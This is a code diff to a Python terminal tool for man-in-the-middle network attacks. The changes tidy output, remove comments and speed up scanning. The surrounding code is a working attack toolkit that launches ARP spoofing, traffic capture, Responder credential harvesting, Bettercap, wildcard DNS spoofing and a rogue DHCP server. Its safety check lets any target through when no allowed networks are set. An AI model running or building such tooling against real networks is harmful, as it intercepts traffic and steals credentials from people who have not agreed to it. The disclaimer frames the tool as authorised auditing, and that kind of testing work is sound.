@@ -49,6 +49,25 @@ logging.basicConfig(
 
 logger = logging.getLogger(__name__)
 
+# --- Helper Functions for ARP Scan Output ---
+def parse_arp_scan(output):
+    """Parse ARP scan output into a list of device dicts."""
+    devices = []
+    for line in output.splitlines():
+        m = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})\s+(.*)", line, re.I)
+        if m:
+            ip, mac, vendor = m.groups()
+            devices.append({'ip': ip, 'mac': mac, 'vendor': vendor})
+    return devices
+
+def print_devices(devices):
+    """Print devices in a clean table."""
+    print("\n{:<15} {:<17} {}".format("IP", "MAC", "Vendor"))
+    print("-" * 50)
+    for d in devices:
+        print("{:<15} {:<17} {}".format(d['ip'], d['mac'], d['vendor']))
+    print()
+
 class MITMTool:
     def __init__(self):
         self.load_config()
@@ -68,11 +87,8 @@ class MITMTool:
     def status_updater(self):
         """Background thread to update packet count and active attacks"""
         while True:
-            # Update packet count by checking tcpdump file size or process stats
-            # For simplicity, just update every 5 seconds with dummy data
             try:
                 if 'tcpdump' in self.capture_processes:
-                    # Could parse tcpdump stats or file size here
                     self.packet_count += 10  # Dummy increment
                 else:
                     self.packet_count = 0
@@ -100,18 +116,14 @@ class MITMTool:
             logger.error(f"Failed to load MAC vendors: {str(e)}")
 
     def get_device_type(self, mac):
-        """Identify device type from MAC address"""
         if not mac or not self.mac_vendors:
             return "Unknown"
-        
         mac = mac.upper().replace('-', ':')
         if len(mac) < 8:
             return "Unknown"
-        
         oui = mac[:8]
         if oui in self.mac_vendors:
             vendor = self.mac_vendors[oui]
-            
             if "Apple" in vendor:
                 return "Apple"
             elif "Samsung" in vendor:
@@ -138,32 +150,21 @@ class MITMTool:
         return "Unknown"
 
     def get_device_name(self, ip, mac):
-        """Try multiple methods to get human-readable device names"""
-        # Method 1: Check DHCP hostname first
         dhcp_name = self.get_dhcp_name(mac)
         if dhcp_name and dhcp_name.lower() not in ['unknown', 'localhost', 'android']:
             return dhcp_name
-            
-        # Method 2: Try NetBIOS name resolution
         netbios_name = self.get_netbios_name(ip)
         if netbios_name:
             return netbios_name
-            
-        # Method 3: Try mDNS (Bonjour)
         mdns_name = self.get_mdns_name(ip)
         if mdns_name:
             return mdns_name
-            
-        # Method 4: Try LLMNR
         llmnr_name = self.get_llmnr_name(ip)
         if llmnr_name:
             return llmnr_name
-            
-        # Fallback to MAC vendor + IP
         return f"{self.get_device_type(mac)} Device"
 
     def get_dhcp_name(self, mac):
-        """Extract hostname from DHCP leases"""
         try:
             with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                 for line in f:
@@ -175,7 +176,6 @@ class MITMTool:
         return None
 
     def get_netbios_name(self, ip):
-        """Get NetBIOS name using nmblookup"""
         try:
             result = subprocess.run(
                 ["nmblookup", "-A", ip],
@@ -189,7 +189,6 @@ class MITMTool:
         return None
 
     def get_mdns_name(self, ip):
-        """Try to resolve mDNS (Bonjour) name"""
         try:
             result = subprocess.run(
                 ["avahi-resolve", "-a", ip],
@@ -204,42 +203,30 @@ class MITMTool:
         return None
 
     def get_llmnr_name(self, ip):
-        """Try LLMNR name resolution"""
         try:
             result = subprocess.run(
                 ["nmblookup", "-A", ip],
                 capture_output=True, text=True, timeout=2
             )
             for line in result.stdout.split('\n'):
-                if "<20>" in line:  # File Server Service
+                if "<20>" in line:
                     return line.split()[0]
         except:
             pass
         return None
 
     def enhance_device_info(self, device):
-        """Add additional identification to device info"""
         ip = device.get('ip')
         mac = device.get('mac')
-        
         if not ip or not mac:
             return device
-            
-        # Add device name
         device['name'] = self.get_device_name(ip, mac)
-        
-        # Add manufacturer from MAC
         device['manufacturer'] = self.get_device_type(mac)
-        
-        # Try to get operating system info
         device['os'] = self.guess_os(ip, mac)
-        
         return device
 
     def guess_os(self, ip, mac):
-        """Attempt to guess operating system"""
         vendor = self.get_device_type(mac).lower()
-        
         if 'apple' in vendor:
             return 'macOS/iOS'
         elif 'android' in vendor or 'google' in vendor:
@@ -248,8 +235,6 @@ class MITMTool:
             return 'Windows'
         elif 'linux' in vendor:
             return 'Linux'
-            
-        # Try nmap OS detection if available
         try:
             result = subprocess.run(
                 ["nmap", "-O", "--osscan-limit", ip],
@@ -259,11 +244,9 @@ class MITMTool:
                 return result.stdout.split("OS details:")[1].split('\n')[0].strip()
         except:
             pass
-            
         return 'Unknown'
 
     def load_config(self):
-        """Load configuration from file"""
         try:
             with open(CONFIG_FILE) as f:
                 self.config = json.load(f)
@@ -278,7 +261,6 @@ class MITMTool:
             logger.warning("Using default configuration")
 
     def check_safety(self):
-        """Display legal disclaimers and safety checks"""
         disclaimer = """
         WARNING: This tool is for authorized security auditing and penetration testing only.
         Unauthorized use is illegal and unethical. By using this tool, you agree that:
@@ -290,7 +272,6 @@ class MITMTool:
         The developers assume no liability for misuse of this software.
         """
         print(disclaimer)
-        
         if not self.config.get("legal_disclaimer_accepted", False):
             response = input("Do you accept these terms? (yes/no): ").strip().lower()
             if response != "yes":
@@ -300,34 +281,27 @@ class MITMTool:
             self.save_config()
 
     def save_config(self):
-        """Save configuration to file"""
         os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
         with open(CONFIG_FILE, 'w') as f:
             json.dump(self.config, f, indent=4)
 
     def setup_environment(self):
-        """Create necessary directories and check dependencies"""
         os.makedirs(DATA_DIR, exist_ok=True)
-        
-        # Check for required tools
         required_tools = [
             'arpspoof', 'dsniff', 'nmap', 'tcpdump', 
             'bettercap', 'responder', 'tailscale', 'iwlist',
             'brctl', 'ifconfig', 'arp', 'nmblookup', 'avahi-resolve',
             'dnsmasq'
         ]
-        
         missing_tools = []
         for tool in required_tools:
             if not self.check_tool_installed(tool):
                 missing_tools.append(tool)
-                
         if missing_tools:
             logger.error(f"Missing required tools: {', '.join(missing_tools)}")
             sys.exit(1)
 
     def check_tool_installed(self, tool):
-        """Check if a command line tool is installed"""
         try:
             subprocess.run(["which", tool], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             return True
@@ -335,11 +309,9 @@ class MITMTool:
             return False
 
     def detect_interfaces(self):
-        """Detect available network interfaces"""
         self.interfaces = {}
         try:
             interfaces = netifaces.interfaces()
-            
             for iface in interfaces:
                 if iface.startswith('eth') or iface.startswith('en') or iface.startswith('wlan'):
                     addrs = netifaces.ifaddresses(iface)
@@ -351,24 +323,18 @@ class MITMTool:
                             'mac': addrs[netifaces.AF_LINK][0]['addr'] if netifaces.AF_LINK in addrs else '',
                             'type': 'wifi' if iface.startswith('wlan') else 'ethernet'
                         }
-            
             logger.info(f"Detected interfaces: {json.dumps(self.interfaces, indent=2)}")
             return len(self.interfaces) >= 1
-            
         except Exception as e:
             logger.error(f"Error detecting interfaces: {str(e)}")
             return False
 
     def setup_bridge(self):
-        """Bridge two Ethernet interfaces"""
         ethernet_ifaces = [iface for iface in self.interfaces if self.interfaces[iface]['type'] == 'ethernet']
-        
         if len(ethernet_ifaces) < 2:
             logger.error("Need at least two Ethernet interfaces to create a bridge")
             return False
-            
         iface1, iface2 = ethernet_ifaces[:2]
-        
         try:
             subprocess.run(["sudo", "ifconfig", iface1, "0.0.0.0"], check=True)
             subprocess.run(["sudo", "ifconfig", iface2, "0.0.0.0"], check=True)
@@ -378,60 +344,59 @@ class MITMTool:
             subprocess.run(["sudo", "ifconfig", "mitm-bridge", "up"], check=True)
             logger.info(f"Successfully bridged {iface1} and {iface2} via mitm-bridge")
             return True
-            
         except subprocess.CalledProcessError as e:
             logger.error(f"Failed to create bridge: {str(e)}")
             return False
 
     def network_scan(self):
-        """Perform network scan using nmap and arp-scan"""
+        """Perform network scan using arp-scan and nmap, with clean output and no hanging."""
         if not self.interfaces:
             logger.error("No interfaces detected")
             return
-            
+
         interface = list(self.interfaces.keys())[0]
-        
         try:
             logger.info("Running ARP scan...")
             arp_scan = subprocess.run(
                 ["sudo", "arp-scan", "--interface", interface, "--localnet"],
                 capture_output=True, text=True
             )
-            print(arp_scan.stdout)
-            
-            logger.info("Running Nmap scan...")
-            subnet = self.get_subnet(interface)
-            if subnet:
+            arp_devices = parse_arp_scan(arp_scan.stdout)
+            print_devices(arp_devices)
+
+            # Only scan found hosts with Nmap
+            ips = [d['ip'] for d in arp_devices]
+            if ips:
+                logger.info("Running Nmap scan on discovered hosts...")
+                nmap_cmd = ["sudo", "nmap", "-sV", "-O", "-T4", "--max-retries", "2", "-F"] + ips
                 nmap_scan = subprocess.run(
-                    ["sudo", "nmap", "-sV", "-O", subnet],
-                    capture_output=True, text=True
+                    nmap_cmd,
+                    capture_output=True, text=True, timeout=90
                 )
                 print(nmap_scan.stdout)
-                
+            else:
+                logger.warning("No hosts found in ARP scan")
+
+        except subprocess.TimeoutExpired:
+            logger.error("Nmap scan timed out!")
         except Exception as e:
             logger.error(f"Scanning failed: {str(e)}")
 
     def get_subnet(self, interface):
-        """Calculate subnet from interface IP and netmask"""
         if interface not in self.interfaces:
             return None
-            
         ip = self.interfaces[interface]['ip']
         netmask = self.interfaces[interface]['netmask']
-        
         if not ip or not netmask:
             return None
-            
         if netmask == "255.255.255.0":
             return ".".join(ip.split(".")[:3]) + ".0/24"
         return None
 
     def arp_spoof(self, target_ip, gateway_ip):
-        """Start ARP spoofing between target and gateway"""
         if not self.check_target_safety(target_ip):
             logger.error(f"Target {target_ip} is not in allowed networks")
             return
-            
         try:
             subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
             cmd1 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", target_ip, gateway_ip]
@@ -441,27 +406,22 @@ class MITMTool:
             self.active_attacks.add('ARP Spoofing')
             logger.info(f"ARP spoofing started between {target_ip} and {gateway_ip}")
             return True
-            
         except Exception as e:
             logger.error(f"ARP spoofing failed: {str(e)}")
             return False
 
     def check_target_safety(self, target_ip):
-        """Check if target is in allowed networks"""
         if not self.config.get("allowed_networks"):
             return True
-            
         for network in self.config.get("allowed_networks", []):
             if target_ip.startswith(network):
                 return True
         return False
 
     def start_packet_capture(self, interface="mitm-bridge", filename=None):
-        """Start packet capture with tcpdump"""
         if not filename:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"{DATA_DIR}/capture_{timestamp}.pcap"
-            
         try:
             cmd = [
                 "sudo", "tcpdump", "-i", interface, 
@@ -472,13 +432,11 @@ class MITMTool:
             self.active_attacks.add('Packet Capture')
             logger.info(f"Packet capture started on {interface}, saving to {filename}")
             return True
-            
         except Exception as e:
             logger.error(f"Packet capture failed: {str(e)}")
             return False
 
     def start_responder(self, interface="mitm-bridge"):
-        """Start Responder for credential harvesting"""
         try:
             cmd = [
                 "sudo", "responder", "-I", interface,
@@ -488,13 +446,11 @@ class MITMTool:
             self.active_attacks.add('Responder')
             logger.info(f"Responder started on {interface}")
             return True
-            
         except Exception as e:
             logger.error(f"Failed to start Responder: {str(e)}")
             return False
 
     def start_bettercap(self, interface="mitm-bridge", script_path=None):
-        """Start Bettercap with optional script for advanced MITM attacks"""
         try:
             cmd = ["sudo", "bettercap", "-iface", interface]
             if script_path:
@@ -508,8 +464,6 @@ class MITMTool:
             return False
 
     def start_dns_spoof(self, interface="mitm-bridge", hosts_file="/etc/mitm_tool/dns_hosts"):
-        """Start DNS spoofing using Bettercap caplet"""
-        # Create a simple Bettercap caplet for DNS spoofing
         caplet_content = f"""
 set dns.spoof.domains *
 set dns.spoof.address 192.168.1.1
@@ -525,7 +479,6 @@ dns.spoof on
             return False
 
     def start_rogue_dhcp(self, interface="mitm-bridge"):
-        """Start a rogue DHCP server using dnsmasq"""
         dhcp_conf = f"""
 interface={interface}
 dhcp-range=192.168.1.100,192.168.1.200,12h
@@ -546,7 +499,6 @@ dhcp-option=6,192.168.1.1
             return False
 
     def stop_all_attacks(self):
-        """Stop all running attack processes"""
         for name, proc in self.capture_processes.items():
             try:
                 proc.terminate()
@@ -561,7 +513,6 @@ dhcp-option=6,192.168.1.1
         logger.info("All attacks stopped and IP forwarding disabled")
 
     def show_status(self, stdscr):
-        """Display real-time status in curses window"""
         stdscr.clear()
         stdscr.border(0)
         stdscr.addstr(1, 2, "MITM Network Auditing Tool - Status", curses.A_BOLD)
@@ -572,7 +523,6 @@ dhcp-option=6,192.168.1.1
         stdscr.refresh()
 
     def tui_main(self, stdscr):
-        """Main curses TUI loop"""
         curses.curs_set(0)
         current_row = 0
         menu = [
@@ -618,9 +568,10 @@ dhcp-option=6,192.168.1.1
                 stdscr.clear()
                 stdscr.refresh()
                 if current_row == 0:
+                    curses.endwin()
                     self.network_scan()
-                    stdscr.addstr(2, 2, "Network scan completed. Press any key to continue.")
-                    stdscr.getch()
+                    input("Network scan completed. Press Enter to continue.")
+                    stdscr.refresh()
                 elif current_row == 1:
                     stdscr.addstr(2, 2, "Enter target IP: ")
                     curses.echo()
